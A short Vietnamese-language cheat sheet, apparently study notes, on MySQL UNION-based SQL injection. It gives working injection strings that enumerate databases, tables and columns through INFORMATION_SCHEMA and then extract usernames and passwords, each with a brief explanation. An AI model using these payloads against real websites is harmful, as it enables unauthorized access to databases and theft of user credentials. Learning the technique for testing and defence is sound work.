# MY SQL INJECTION

## Version
`@@version`

## Database 
```sql
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;
```

- Columns **SCHEMA_NAME** chứa all tên của database hiện tại
- Metadata **INFORMATION_SCHEMA** siêu dữ liệu database và table trên server 
- Table **SCHEMA** chứa tên all database
- Ta cũng có thể lấy tên database hiện tại qua hàm **database()**

```sqli
cn' UNION select 1,database(),2,3-- -
```

## TABLES
```sql
cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
```

- Columns **TABLE_NAME* chứa all tên của tables hiện tại
- Colums **TABLE_SCHEMA** chứa tên csdl của tables đang trỏ đến
- Table **INFORMATION_SCHEMA.TABLES** siêu dữ liệu chứa all table trên server 
- table_schema='dev' ví dụ ta có tên csdl là dev và truy vấn all các table trên csdl dev đó 

## Columns 
```sql
cn' UNION select 1,COLUMN_NAME,TABLE_NAME,4 from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
```

- Columns **COLUMN_NAME* chứa all tên của columns hiện tại trên table 
- Table **INFORMATION_SCHEMA.COLUMNS** siêu dữ liệu chứa all column trong table
- table_name='devss' ví dụ ta có tên csdl ta lấy được tên table là devs và truy vấn all các columns trên tables devss đó 

## DATA
```sql
cn' UNION select 1, username, password, 4 from dev.devss-- -
```

- dev.devss là tables hiện tại csdl_name.table_name
